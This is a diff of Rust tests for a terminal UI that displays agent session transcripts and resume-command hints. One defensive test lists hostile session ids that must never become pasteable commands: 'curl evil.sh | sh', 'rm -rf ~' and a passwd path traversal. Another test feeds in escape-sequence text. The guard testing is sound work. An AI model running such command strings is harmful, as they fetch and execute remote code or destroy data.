@@ -230,15 +230,35 @@ fn views() -> Views {
     views_with("intake")
 }
 
+/// A readable shared result over the given turns, under a Claude
+/// reference. The reader owns every other fact; a test overrides the ones
+/// it is asking about.
+fn read_of(turns: Vec<Turn>, truncated: bool) -> TranscriptRead {
+    TranscriptRead::readable(
+        Some(brokkr_view::Transcript {
+            kind: "claude-session".to_string(),
+            locator: "abcd-1234".to_string(),
+            home: "/home/operator/.claude/projects".to_string(),
+        }),
+        false,
+        brokkr_view::transcript::TranscriptKind::ClaudeSession,
+        Some("/home/operator/.claude/projects/live-project/abcd-1234.jsonl".to_string()),
+        turns,
+        truncated,
+        0,
+        0,
+    )
+}
+
 /// A transcript of `count` prose turns, each naming its own index — so
 /// "the SAME turn" is askable by text, not just by position.
-fn turns_of(count: usize) -> Vec<crate::ui::Turn> {
+fn turns_of(count: usize) -> Vec<Turn> {
     (0..count)
-        .map(|index| crate::ui::Turn {
+        .map(|index| Turn {
             role: format!("turn {index}"),
             ts: T1.to_string(),
-            blocks: vec![crate::ui::Block {
-                kind: "text",
+            blocks: vec![brokkr_view::transcript::Block {
+                kind: BlockKind::Text,
                 text: format!("prose of turn {index}"),
             }],
         })
@@ -733,7 +753,7 @@ fn the_footer_names_the_keys_of_the_context_it_is_in() {
         states[6]
     );
     let mut transcript = views_with("intake");
-    transcript.transcript = Some((turns_of(2), false));
+    transcript.transcript = Some(read_of(turns_of(2), false));
     apply(&mut tui, &transcript, Key::Down);
     let selected_footer = footer_for(&tui, &views);
     assert!(
@@ -933,22 +953,23 @@ fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
     apply(&mut tui, &views, Key::Enter);
     assert_eq!(tui.level, Level::Participant);
 
-    // No local transcript: the pane says so, and the resume line is
-    // still there — it is the escape hatch that always exists.
+    // No read yet: the pane says so, and the reader owns any convenience
+    // line — none is invented here.
     let frame = frame_of(&tui, &views, 100, 26);
     assert!(frame.contains("transcript  claude-session"), "{frame}");
-    assert!(frame.contains("claude --resume abcd-1234"), "{frame}");
+    assert!(!frame.contains("claude --resume"), "{frame}");
     assert!(frame.contains("no local session transcript"), "{frame}");
     assert!(frame.contains("effect/succeeded"), "terminal_line: {frame}");
     assert!(frame.contains("Read"), "the checkpoint stream: {frame}");
 
-    // With one: prose and tool markers, and the truncation flag SHOWN.
-    views.transcript = Some((
-        vec![crate::ui::Turn {
+    // With one: prose and tool markers, the truncation flag SHOWN, and
+    // the shared full-session line rendered verbatim.
+    views.transcript = Some(read_of(
+        vec![Turn {
             role: "assistant".to_string(),
             ts: T1.to_string(),
-            blocks: vec![crate::ui::Block {
-                kind: "text",
+            blocks: vec![brokkr_view::transcript::Block {
+                kind: BlockKind::Text,
                 text: "the seat's own words".to_string(),
             }],
         }],
@@ -957,6 +978,10 @@ fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
     let frame = frame_of(&tui, &views, 100, 26);
     assert!(frame.contains("the seat's own words"), "{frame}");
     assert!(frame.contains("transcript truncated"), "{frame}");
+    assert!(
+        frame.contains("full session: claude --resume abcd-1234"),
+        "{frame}"
+    );
 
     // A seat with no transcript still gets the common plain label.
     let views = views_with("intake");
@@ -969,12 +994,12 @@ fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
 }
 
 #[test]
-fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
-    // session_id is a raw journal string rendered into a command the
-    // operator is invited to paste. Control characters are stripped,
-    // but ';', '&&', '$(…)' and backticks are not — so an id that
-    // cannot name a transcript is shown as an absence, never as a
-    // suggestion. Same guard the session lookup already applies.
+fn a_shell_fragment_id_never_becomes_a_pasteable_command() {
+    // A flat `session_id` is a raw journal string. Control characters are
+    // stripped, but ';', '&&', '$(…)' and backticks are not — so an id
+    // that cannot name a transcript is refused as `invalid-reference`
+    // with no convenience line and no reading door. The TUI constructs no
+    // command of its own: it renders the reader's null hint as no line.
     for hostile in [
         "abc; curl evil.sh | sh",
         "abc && rm -rf ~",
@@ -983,16 +1008,30 @@ fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
         "../../etc/passwd",
     ] {
         assert!(
-            !crate::ui::valid_session_id(hostile),
+            !brokkr_view::transcript::valid_claude_id(hostile),
             "{hostile:?} must not pass the guard"
         );
         let mut views = views();
         for part in &mut views.run.as_mut().unwrap().participants {
+            part.transcript = None;
             part.session_id = Some(hostile.to_string());
         }
-        let mut tui = at_seats("eff-d");
+        let mut tui = at_seats("eff-i");
         apply(&mut tui, &views, Key::Enter);
         apply(&mut tui, &views, Key::Enter);
+        let subject = subject_of(&tui, &views).expect("the seat is selected");
+        let read = crate::ui::read_local(
+            subject.reference.as_ref(),
+            subject.provenance,
+            subject.legacy_id.as_deref(),
+        );
+        assert_eq!(
+            read.unavailable,
+            Some(brokkr_view::transcript::Unavailable::InvalidReference),
+            "{hostile:?}"
+        );
+        assert!(read.full_session.is_none(), "{hostile:?}");
+        views.transcript = Some(read);
         let frame = frame_of(&tui, &views, 100, 26);
         assert!(
             !frame.contains("claude --resume"),
@@ -1006,7 +1045,7 @@ fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
 #[test]
 fn the_checkpoint_pane_scrolls_and_the_transcript_pane_moves_a_turn_cursor() {
     let mut views = views();
-    views.transcript = Some((turns_of(4), false));
+    views.transcript = Some(read_of(turns_of(4), false));
     let mut tui = at_seats("eff-i");
     apply(&mut tui, &views, Key::Enter);
     apply(&mut tui, &views, Key::Enter);
@@ -1412,7 +1451,7 @@ fn the_shell_redraws_keeps_keys_live_through_a_bad_journal_and_gives_up_at_last(
 }
 
 #[test]
-fn the_shell_asks_for_the_seats_session_only_while_that_seat_is_open() {
+fn the_shell_asks_for_the_seats_subject_only_while_that_seat_is_open() {
     let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
     let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
     script(&[
@@ -1426,16 +1465,14 @@ fn the_shell_asks_for_the_seats_session_only_while_that_seat_is_open() {
     ]);
     let mut asked: Vec<Option<String>> = Vec::new();
     let mut source = |ask: Ask| {
-        asked.push(ask.session.map(str::to_string));
+        asked.push(ask.subject.as_ref().map(|subject| subject.key.clone()));
         Ok(Some(views()))
     };
     let mut tui = Tui::new(None);
     drive(&mut terminal, &test_ops(), &mut source, &mut tui, 12).unwrap();
     assert!(
-        asked
-            .iter()
-            .any(|session| session.as_deref() == Some("abcd-1234")),
-        "the open seat's session id is a model field: {asked:?}"
+        asked.iter().any(|key| key.as_deref() == Some("eff-i")),
+        "the open seat's key names a subject: {asked:?}"
     );
     assert!(
         asked.first().unwrap().is_none(),
@@ -1443,10 +1480,10 @@ fn the_shell_asks_for_the_seats_session_only_while_that_seat_is_open() {
     );
 }
 
-/// The shell watches a transcript file only while the seat can still
-/// write to it. `status` is a model field this branches on — the same
-/// one the seats table shows — and the question is asked where the
-/// `Ask` is built, never inside `apply`, which has no notion of a file.
+/// The shell re-resolves a transcript only while the seat can still write
+/// to it. `status` is a model field this branches on — the same one the
+/// seats table shows — and the question is asked where the `Ask` is
+/// built, never inside `apply`, which has no notion of a file.
 #[test]
 fn the_shell_watches_a_transcript_only_while_its_seat_is_working() {
     let views = views();
@@ -1454,9 +1491,10 @@ fn the_shell_watches_a_transcript_only_while_its_seat_is_working() {
     apply(&mut tui, &views, Key::Enter);
     apply(&mut tui, &views, Key::Enter);
     assert_eq!(tui.level, Level::Participant);
-    assert_eq!(session_of(&tui, &views), Some("abcd-1234"));
+    let subject = subject_of(&tui, &views).expect("a selected participant is a subject");
+    assert_eq!(subject.key, "eff-i");
     assert!(
-        !session_is_live(&tui, &views),
+        !subject.working,
         "a concluded seat's transcript is already whole"
     );
 
@@ -1465,19 +1503,22 @@ fn the_shell_watches_a_transcript_only_while_its_seat_is_working() {
     for part in &mut live.run.as_mut().unwrap().participants {
         part.status = "working".to_string();
     }
-    assert!(session_is_live(&tui, &live));
+    assert!(subject_of(&tui, &live).unwrap().working);
 
-    // A working seat with no session id has no file to watch...
+    // A working seat with no reference at all is still a subject: the
+    // reader owns the refusal, so the pane can show it rather than
+    // silently holding no door.
     for part in &mut live.run.as_mut().unwrap().participants {
-        if let Some(transcript) = &mut part.transcript {
-            transcript.locator.clear();
-        }
+        part.transcript = None;
         part.session_id = None;
     }
-    assert!(!session_is_live(&tui, &live));
+    let subject = subject_of(&tui, &live).expect("a subject is still selected");
+    assert!(subject.reference.is_none());
+    assert!(subject.legacy_id.is_none());
+    assert!(subject.working);
 
-    // ...and neither has an operator who is not drilled into one.
-    assert!(!session_is_live(&at_run(), &views));
+    // ...but an operator who is not drilled into a seat has no subject.
+    assert!(subject_of(&at_run(), &views).is_none());
 }
 
 /// A panel with no sequence steps: one fork, no step label. The other
@@ -1612,12 +1653,12 @@ fn a_filtered_fleet_a_stopped_run_a_bare_fork_and_a_whole_transcript_all_draw() 
 
     // A transcript that fits carries no truncation line.
     let mut views = views;
-    views.transcript = Some((
-        vec![crate::ui::Turn {
+    views.transcript = Some(read_of(
+        vec![Turn {
             role: "user".to_string(),
             ts: T0.to_string(),
-            blocks: vec![crate::ui::Block {
-                kind: "tool",
+            blocks: vec![brokkr_view::transcript::Block {
+                kind: BlockKind::Tool,
                 text: "Read · docs/decisions/0014-interactive-tui.md".to_string(),
             }],
         }],
@@ -3026,7 +3067,7 @@ fn at_transcript(views: &Views) -> Tui {
 #[test]
 fn the_transcript_cursor_moves_over_turns_and_survives_an_appending_refresh() {
     let mut views = views();
-    views.transcript = Some((turns_of(3), false));
+    views.transcript = Some(read_of(turns_of(3), false));
     let mut tui = at_transcript(&views);
     assert_eq!(tui.turn, None, "no selection until the cursor moves");
 
@@ -3054,7 +3095,7 @@ fn the_transcript_cursor_moves_over_turns_and_survives_an_appending_refresh() {
     // names the same turn against a refresh that grew the stream.
     apply(&mut tui, &views, Key::Char('j'));
     let mut grown = views_with("intake");
-    grown.transcript = Some((turns_of(5), false));
+    grown.transcript = Some(read_of(turns_of(5), false));
     let (index, turn) = selected_turn(&tui, &grown).expect("the cursor survives");
     assert_eq!(index, 1);
     assert_eq!(turn.role, "turn 1", "the SAME turn, not a shifted one");
@@ -3062,7 +3103,7 @@ fn the_transcript_cursor_moves_over_turns_and_survives_an_appending_refresh() {
     // A transcript that shrank below the key selects nothing, and the
     // cursor restarts from the top when it moves — like every list.
     let mut shrunk = views_with("intake");
-    shrunk.transcript = Some((turns_of(1), false));
+    shrunk.transcript = Some(read_of(turns_of(1), false));
     assert!(selected_turn(&tui, &shrunk).is_none());
     apply(&mut tui, &shrunk, Key::Down);
     assert_eq!(tui.turn.as_deref(), Some("0"));
@@ -3071,17 +3112,17 @@ fn the_transcript_cursor_moves_over_turns_and_survives_an_appending_refresh() {
 #[test]
 fn enter_on_a_transcript_turn_opens_the_whole_turn_in_the_reader() {
     let mut views = views();
-    views.transcript = Some((
-        vec![crate::ui::Turn {
+    views.transcript = Some(read_of(
+        vec![Turn {
             role: "assistant".to_string(),
             ts: T1.to_string(),
             blocks: vec![
-                crate::ui::Block {
-                    kind: "text",
+                brokkr_view::transcript::Block {
+                    kind: BlockKind::Text,
                     text: "the whole prose of a long turn".to_string(),
                 },
-                crate::ui::Block {
-                    kind: "tool",
+                brokkr_view::transcript::Block {
+                    kind: BlockKind::Tool,
                     text: "Write · specs/interactive-tui/spec.md".to_string(),
                 },
             ],
@@ -3124,24 +3165,24 @@ fn enter_with_no_turn_selected_opens_the_whole_transcript() {
     // and the separation are all askable of the one string.
     let pair = || {
         vec![
-            crate::ui::Turn {
+            Turn {
                 role: "user".to_string(),
                 ts: T0.to_string(),
-                blocks: vec![crate::ui::Block {
-                    kind: "text",
+                blocks: vec![brokkr_view::transcript::Block {
+                    kind: BlockKind::Text,
                     text: "the first prose".to_string(),
                 }],
             },
-            crate::ui::Turn {
+            Turn {
                 role: "assistant".to_string(),
                 ts: T1.to_string(),
                 blocks: vec![
-                    crate::ui::Block {
-                        kind: "text",
+                    brokkr_view::transcript::Block {
+                        kind: BlockKind::Text,
                         text: "the second prose".to_string(),
                     },
-                    crate::ui::Block {
-                        kind: "tool",
+                    brokkr_view::transcript::Block {
+                        kind: BlockKind::Tool,
                         text: "Write · specs/interactive-tui/spec.md".to_string(),
                     },
                 ],
@@ -3149,66 +3190,86 @@ fn enter_with_no_turn_selected_opens_the_whole_transcript() {
         ]
     };
     let mut views = views();
-    views.transcript = Some((pair(), true));
+    views.transcript = Some(read_of(pair(), true));
     let mut tui = at_transcript(&views);
     assert_eq!(tui.turn, None, "the pane opens with no turn selected");
 
     apply(&mut tui, &views, Key::Enter);
     let text = tui.reading.clone().expect("Enter opens the reader");
     // Stream order, the ⚙ marker per tool block, ONE blank line between
-    // turns, and the truncation notice last — asked as the whole string,
-    // because the composition IS the contract.
+    // turns, then the reader's own notice and verbatim full-session line —
+    // asked as the whole string, because the composition IS the contract.
     assert_eq!(
         text,
         format!(
-            "user  {T0}\n\
+            "#1 user  {T0}\n\
              \n\
              the first prose\n\
              \n\
-             assistant  {T1}\n\
+             #2 assistant  {T1}\n\
              \n\
              the second prose\n\
              ⚙ Write · specs/interactive-tui/spec.md\n\
              \n\
-             transcript truncated (size cap) — claude --resume carries the rest"
+             transcript truncated (size cap)\n\
+             \n\
+             full session: claude --resume abcd-1234"
         ),
         "{text}"
     );
+    // The shared notice carries no retired Claude suffix.
+    assert!(
+        text.contains("\ntranscript truncated (size cap)\n"),
+        "{text}"
+    );
+    assert!(!text.contains("carries the rest"), "{text}");
     assert_eq!(
         text.lines().last(),
-        Some("transcript truncated (size cap) — claude --resume carries the rest"),
-        "the notice is the FINAL line"
+        Some("full session: claude --resume abcd-1234"),
+        "the hint is the FINAL line"
     );
     assert_eq!(tui.read_offset, 0, "a fresh door opens at the top");
 
-    // The same door on an untruncated transcript carries no notice.
+    // The same door on an untruncated transcript carries no notice, but
+    // still carries the shared hint.
     apply(&mut tui, &views, Key::Escape);
     let mut whole = views_with("intake");
-    whole.transcript = Some((pair(), false));
+    whole.transcript = Some(read_of(pair(), false));
     apply(&mut tui, &whole, Key::Enter);
     let text = tui.reading.clone().expect("Enter opens the reader");
     assert!(!text.contains("truncated"), "{text}");
     assert!(
-        text.ends_with("⚙ Write · specs/interactive-tui/spec.md"),
+        text.contains("⚙ Write · specs/interactive-tui/spec.md"),
+        "{text}"
+    );
+    assert!(
+        text.ends_with("full session: claude --resume abcd-1234"),
         "{text}"
     );
 
-    // A transcript of no turns is still a door — the pane HOLDS a
-    // transcript, so Enter opens it, empty body and all. A pane holding
-    // no transcript at all holds no door.
+    // A readable transcript of no turns still opens its explanation and
+    // any full-session line: it is not an apparently missing session.
     apply(&mut tui, &whole, Key::Escape);
     let mut empty = views_with("intake");
-    empty.transcript = Some((Vec::new(), false));
+    empty.transcript = Some(read_of(Vec::new(), false));
     apply(&mut tui, &empty, Key::Enter);
-    assert_eq!(tui.reading.as_deref(), Some(""), "no turns, an empty body");
+    assert_eq!(
+        tui.reading.as_deref(),
+        Some("no readable turns\n\nfull session: claude --resume abcd-1234"),
+        "no turns, but an openable explanation"
+    );
     apply(&mut tui, &empty, Key::Escape);
     let mut capped = views_with("intake");
-    capped.transcript = Some((Vec::new(), true));
+    capped.transcript = Some(read_of(Vec::new(), true));
     apply(&mut tui, &capped, Key::Enter);
     assert_eq!(
         tui.reading.as_deref(),
-        Some("transcript truncated (size cap) — claude --resume carries the rest"),
-        "no turns but a cap: the notice alone"
+        Some(
+            "no readable turns — transcript truncated (size cap)\n\n\
+             transcript truncated (size cap)\n\n\
+             full session: claude --resume abcd-1234"
+        ),
+        "no turns but a cap: the capped explanation, the notice and the hint"
     );
     apply(&mut tui, &capped, Key::Escape);
     apply(&mut tui, &views_with("intake"), Key::Enter);
@@ -3226,7 +3287,7 @@ fn enter_with_no_turn_selected_opens_the_whole_transcript() {
 #[test]
 fn esc_at_the_transcript_pane_clears_the_turn_before_it_ascends() {
     let mut views = views();
-    views.transcript = Some((turns_of(2), false));
+    views.transcript = Some(read_of(turns_of(2), false));
     let mut tui = at_transcript(&views);
 
     apply(&mut tui, &views, Key::Down);
@@ -3269,7 +3330,7 @@ fn esc_at_the_transcript_pane_clears_the_turn_before_it_ascends() {
 #[test]
 fn the_selected_turn_is_marked_and_the_footer_names_the_reader() {
     let mut views = views();
-    views.transcript = Some((turns_of(3), false));
+    views.transcript = Some(read_of(turns_of(3), false));
     let mut tui = at_transcript(&views);
     apply(&mut tui, &views, Key::Down);
     apply(&mut tui, &views, Key::Char('j'));
@@ -3302,12 +3363,12 @@ fn the_selected_turn_is_marked_and_the_footer_names_the_reader() {
 #[test]
 fn a_hostile_transcript_turn_renders_inert_in_the_reader() {
     let mut views = views();
-    views.transcript = Some((
-        vec![crate::ui::Turn {
+    views.transcript = Some(read_of(
+        vec![Turn {
             role: "assis\u{202E}tant\x07".to_string(),
             ts: "\x1b]0;pwn\x07 late".to_string(),
-            blocks: vec![crate::ui::Block {
-                kind: "text",
+            blocks: vec![brokkr_view::transcript::Block {
+                kind: BlockKind::Text,
                 text: "prose\x1b[2Jwith\rescapes".to_string(),
             }],
         }],
@@ -3448,21 +3509,25 @@ fn a_session_held_by_another_harness_never_renders_as_a_claude_command() {
         frame.contains("the transcript line above names it"),
         "{frame}"
     );
-
-    assert_eq!(
-        super::session_line("abcd"),
-        "full session: claude --resume abcd"
-    );
 }
 
 /// A journal written before decision 0032 carries only the flat
-/// `session_id`, and names its harness through provenance alone. A codex
-/// thread id is hex and dashes, so it passes the display guard; only the
-/// provenance can keep it out of a `claude --resume` line. Provenance
-/// absent predates decision 0016, when every seat was a claude seat.
+/// `session_id`, and names its harness through provenance alone. The
+/// subject maps that provenance to the shared legacy rule, so only a
+/// Claude, LaneTally or absent-provenance seat can synthesize a Claude
+/// reference — and only that synthesized reference carries a Claude
+/// `full_session` hint. Codex and DSH keep the shared `no-reference`
+/// refusal with no hint and no door.
 #[test]
-fn a_pre_0032_journal_keeps_the_provider_guard_on_the_resume_line() {
-    for (provider, resumable) in [
+fn a_pre_0032_journal_keeps_the_provider_guard_on_the_legacy_reference() {
+    let _home = crate::tests::HOME
+        .lock()
+        .unwrap_or_else(|error| error.into_inner());
+    let saved_home = std::env::var_os("HOME");
+    let dir = tempfile::tempdir().unwrap();
+    std::env::set_var("HOME", dir.path());
+
+    for (provider, claude_hint) in [
         (Some("codex"), false),
         (Some("dsh"), false),
         (Some("claude"), true),
@@ -3489,16 +3554,32 @@ fn a_pre_0032_journal_keeps_the_provider_guard_on_the_resume_line() {
             transcript: None,
             note: None,
         };
-        let mut tui = at_seats("eff-i");
-        apply(&mut tui, &views, Key::Enter);
-        apply(&mut tui, &views, Key::Enter);
-        let frame = frame_of(&tui, &views, 120, 40);
-        assert!(frame.contains("transcript  —"), "{provider:?}: {frame}");
-        assert_eq!(
-            frame.contains("claude --resume abcd-1234"),
-            resumable,
-            "{provider:?}: {frame}"
+        let part = participant(&views, "eff-i").expect("the seat is present");
+        let read = crate::ui::read_local(
+            part.transcript.as_ref(),
+            legacy_provenance(part),
+            part.session_id.as_deref(),
         );
+        assert_eq!(
+            read.full_session
+                .as_deref()
+                .is_some_and(|hint| hint.contains("claude --resume abcd-1234")),
+            claude_hint,
+            "{provider:?}: {:?}",
+            read.full_session
+        );
+        if !claude_hint {
+            assert_eq!(
+                read.unavailable,
+                Some(brokkr_view::transcript::Unavailable::NoReference),
+                "{provider:?}"
+            );
+        }
+    }
+
+    match saved_home {
+        Some(home) => std::env::set_var("HOME", home),
+        None => std::env::remove_var("HOME"),
     }
 }
 
@@ -5127,6 +5208,1484 @@ fn the_seat_level_prints_the_boundary_beside_the_model_and_on_every_checkpoint()
         "{detail}"
     );
     assert!(detail.contains("model —  boundary —  effort"), "{detail}");
+}
+
+// ------------------------- reading every kind through the pane and doors
+
+/// A readable shared result under any kind, with the reader's own
+/// full-session table applied.
+fn read_kind(
+    kind: brokkr_view::transcript::TranscriptKind,
+    locator: &str,
+    home: &str,
+    path: Option<&str>,
+    turns: Vec<Turn>,
+) -> TranscriptRead {
+    let reference = brokkr_view::Transcript {
+        kind: kind.as_str().to_string(),
+        locator: locator.to_string(),
+        home: home.to_string(),
+    };
+    TranscriptRead::readable(
+        Some(reference),
+        false,
+        kind,
+        path.map(str::to_string),
+        turns,
+        false,
+        0,
+        0,
+    )
+}
+
+fn text_turn(role: &str, text: &str) -> Turn {
+    Turn {
+        role: role.to_string(),
+        ts: T1.to_string(),
+        blocks: vec![brokkr_view::transcript::Block {
+            kind: BlockKind::Text,
+            text: text.to_string(),
+        }],
+    }
+}
+
+fn claude_reference(locator: &str, home: &str) -> brokkr_view::Transcript {
+    brokkr_view::Transcript {
+        kind: "claude-session".to_string(),
+        locator: locator.to_string(),
+        home: home.to_string(),
+    }
+}
+
+fn refused_read(
+    reference: brokkr_view::Transcript,
+    reason: brokkr_view::transcript::Unavailable,
+    explanation: impl Into<String>,
+    path: Option<&str>,
+    hint: Option<&str>,
+) -> TranscriptRead {
+    TranscriptRead::refused(
+        Some(reference),
+        false,
+        reason,
+        explanation,
+        path.map(str::to_string),
+        false,
+        0,
+        0,
+        hint.map(str::to_string),
+    )
+}
+
+fn codex_message(role: &str, text: &str) -> String {
+    let part = if role == "assistant" {
+        "output_text"
+    } else {
+        "input_text"
+    };
+    format!(
+        "{{\"timestamp\":\"2026-01-01T00:00:00Z\",\"type\":\"response_item\",\"payload\":{{\"type\":\"message\",\"role\":\"{role}\",\"id\":\"m1\",\"content\":[{{\"type\":\"{part}\",\"text\":\"{text}\"}}]}}}}\n"
+    )
+}
+
+const DSH_HEADER_V0: &str = "{\"type\":\"session\",\"version\":0}\n";
+
+fn dsh_user(text: &str, seq: i64) -> String {
+    format!(
+        "{{\"type\":\"user/message\",\"data\":{{\"content\":\"{text}\"}},\"seq\":{seq},\"time\":1000}}\n"
+    )
+}
+
+fn dsh_assistant(text: &str, seq: i64) -> String {
+    format!(
+        "{{\"type\":\"assistant/message\",\"data\":{{\"message\":{{\"content\":\"{text}\"}},\"turn\":1,\"step\":1}},\"seq\":{seq},\"time\":2000}}\n"
+    )
+}
+
+fn subject_of_kind(kind: &str, locator: &str, home: &str, working: bool) -> Subject {
+    Subject {
+        tab: 0,
+        realm: None,
+        run: "run-7".to_string(),
+        key: "eff-i".to_string(),
+        reference: Some(brokkr_view::Transcript {
+            kind: kind.to_string(),
+            locator: locator.to_string(),
+            home: home.to_string(),
+        }),
+        provenance: LegacyProvenance::Other,
+        legacy_id: None,
+        working,
+    }
+}
+
+fn refresh_subject(
+    db: &Path,
+    subject: Subject,
+    force: bool,
+    head: &mut Option<(u64, String)>,
+    seen: &mut Option<crate::SourceStamp>,
+) -> Option<Views> {
+    crate::tui_views(
+        db,
+        true,
+        Ask {
+            run: Some("run-7"),
+            subject: Some(subject),
+            force,
+            fleet: false,
+            tab: 0,
+        },
+        head,
+        seen,
+        || "2026-01-01T00:07:03Z".to_string(),
+    )
+    .unwrap()
+}
+
+#[test]
+fn codex_and_dsh_turns_are_browsed_and_opened_with_the_existing_keys() {
+    for (kind, locator, path) in [
+        (
+            brokkr_view::transcript::TranscriptKind::CodexThread,
+            "0199mine",
+            "/home/operator/.codex/sessions/rollout-0199mine.jsonl",
+        ),
+        (
+            brokkr_view::transcript::TranscriptKind::DshSession,
+            "seat/a",
+            "/home/operator/seat/a/p/s/session.jsonl",
+        ),
+    ] {
+        let mut views = views();
+        views.transcript = Some(read_kind(
+            kind,
+            locator,
+            "/home/operator",
+            Some(path),
+            turns_of(2),
+        ));
+        let mut tui = at_transcript(&views);
+        apply(&mut tui, &views, Key::Down);
+        assert_eq!(tui.turn.as_deref(), Some("0"));
+        apply(&mut tui, &views, Key::Char('j'));
+        assert_eq!(tui.turn.as_deref(), Some("1"), "{kind:?}");
+        apply(&mut tui, &views, Key::Enter);
+        let one = tui.reading.clone().expect("a turn opens");
+        assert!(
+            one.contains("prose of turn 1") && !one.contains("prose of turn 0"),
+            "{one}"
+        );
+        apply(&mut tui, &views, Key::Escape);
+        apply(&mut tui, &views, Key::Escape);
+        assert_eq!(tui.turn, None, "Esc clears the turn selection");
+        apply(&mut tui, &views, Key::Enter);
+        let all = tui.reading.clone().expect("the whole transcript opens");
+        assert!(
+            all.contains("prose of turn 0") && all.contains("prose of turn 1"),
+            "{all}"
+        );
+    }
+}
+
+#[test]
+fn a_turn_taller_than_the_pane_opens_whole_and_scrolls() {
+    let long = "x".repeat(4_000);
+    let mut tall = text_turn("assistant", &long);
+    tall.blocks.push(brokkr_view::transcript::Block {
+        kind: BlockKind::Tool,
+        text: "Write · specs/interactive-tui/spec.md".to_string(),
+    });
+    let mut views = views();
+    views.transcript = Some(read_of(vec![tall], false));
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Enter);
+    let text = tui.reading.clone().expect("the tall turn opens");
+    assert!(
+        text.contains(&long),
+        "the whole retained turn, not the pane's clip"
+    );
+    assert!(
+        text.contains("⚙ Write · specs/interactive-tui/spec.md"),
+        "{text}"
+    );
+    apply(&mut tui, &views, Key::PageDown);
+    assert_eq!(tui.read_offset, 10);
+    apply(&mut tui, &views, Key::Char('g'));
+    assert_eq!(tui.read_offset, 0);
+}
+
+#[test]
+fn the_highlighted_turn_number_agrees_with_the_cli_turn_sequence() {
+    let mut views = views();
+    views.transcript = Some(read_of(turns_of(4), false));
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Char('j'));
+    apply(&mut tui, &views, Key::Char('j'));
+    let (index, turn) = selected_turn(&tui, &views).expect("a turn is selected");
+    assert_eq!(index + 1, 3);
+    assert_eq!(turn.role, "turn 2");
+    let frame = frame_of(&tui, &views, 120, 30);
+    assert!(frame.contains("#3 turn 2"), "{frame}");
+    apply(&mut tui, &views, Key::Enter);
+    let one = tui.reading.clone().expect("the selected turn opens");
+    assert!(one.starts_with("#3 "), "{one}");
+}
+
+#[test]
+fn moving_from_a_readable_claude_seat_to_an_unavailable_participant_clears_prose() {
+    let readable = read_of(turns_of(3), false);
+    let unavailable = refused_read(
+        brokkr_view::Transcript {
+            kind: "codex-thread".to_string(),
+            locator: "0199mine".to_string(),
+            home: "/home/operator/.codex".to_string(),
+        },
+        brokkr_view::transcript::Unavailable::NotFound,
+        "no retained transcript file was found",
+        None,
+        None,
+    );
+    assert!(transcript_invalidates(Some(&readable), Some(&unavailable)));
+    let mut views = views();
+    views.transcript = Some(unavailable);
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Enter);
+    assert!(tui.reading.is_none(), "a refused read has no door");
+    let frame = frame_of(&tui, &views, 120, 30);
+    assert!(!frame.contains("prose of turn"), "{frame}");
+    assert!(frame.contains("not-found"), "{frame}");
+    assert!(
+        frame.contains("no retained transcript file was found"),
+        "{frame}"
+    );
+}
+
+#[test]
+fn six_packed_members_are_readable_through_both_doors() {
+    let mut views = views();
+    views.transcript = Some(read_of(turns_of(6), false));
+    let mut tui = at_transcript(&views);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Down);
+    apply(&mut tui, &views, Key::Enter);
+    let one = tui.reading.clone().expect("turn three opens alone");
+    assert!(one.starts_with("#3 "), "{one}");
+    assert!(one.contains("prose of turn 2"), "{one}");
+    assert!(
+        !one.contains("prose of turn 1") && !one.contains("prose of turn 3"),
+        "{one}"
+    );
+    apply(&mut tui, &views, Key::Escape);
+    apply(&mut tui, &views, Key::Escape);
+    apply(&mut tui, &views, Key::Enter);
+    let all = tui.reading.clone().expect("the whole transcript opens");
+    for index in 0..6 {
+        assert!(all.contains(&format!("prose of turn {index}")), "{all}");
+    }
+    assert!(
+        all.find("prose of turn 0").unwrap() < all.find("prose of turn 5").unwrap(),
+        "member order: {all}"
+    );
+}
+
+#[test]
+fn each_kind_names_only_its_own_full_session_and_unresolved_codex_says_so() {
+    let cases = [
+        (
+            brokkr_view::transcript::TranscriptKind::ClaudeSession,
+            "abcd-1234",
+            "claude --resume abcd-1234",
+        ),
+        (
+            brokkr_view::transcript::TranscriptKind::CodexThread,
+            "0199mine",
+            "codex exec resume 0199mine",
+        ),
+        (
+            brokkr_view::transcript::TranscriptKind::DshSession,
+            "seat/a",
+            "full session: path \"",
+        ),
+    ];
+    for (kind, locator, needle) in cases {
+        let read = read_kind(
+            kind,
+            locator,
+            "/home/operator",
+            Some("/home/operator/confirmed.jsonl"),
+            turns_of(1),
+        );
+        let hint = read
+            .full_session
+            .clone()
+            .expect("a confirmed path has a hint");
+        assert!(hint.contains(needle), "{kind:?}: {hint}");
+        let mut views = views();
+        views.transcript = Some(read);
+        let mut tui = at_transcript(&views);
+        apply(&mut tui, &views, Key::Enter);
+        let all = tui.reading.clone().expect("the whole door opens");
+        assert!(
+            all.contains(&hint),
+            "the whole door carries the hint: {all}"
+        );
+        let frame = frame_of(&tui, &views, 200, 30);
+        assert!(frame.contains(&hint), "the pane carries the hint: {frame}");
+    }
+
+    // A valid unresolved Codex reference says so, with its recorded home
+    // and its command, and no guessed date or Claude command.
+    let read = read_kind(
+        brokkr_view::transcript::TranscriptKind::CodexThread,
+        "0199mine",
+        "/home/operator/.codex",
+        None,
+        Vec::new(),
+    );
+    let hint = read
+        .full_session
+        .clone()
+        .expect("rollout unavailable is a hint");
+    assert!(hint.contains("rollout unavailable"), "{hint}");
+    assert!(hint.contains("codex exec resume 0199mine"), "{hint}");
+    assert!(hint.contains("/home/operator/.codex"), "{hint}");
+    assert!(!hint.contains("claude"), "{hint}");
+    assert!(read.is_readable());
+
+    // DSH without a confirmed file has no convenience line at all.
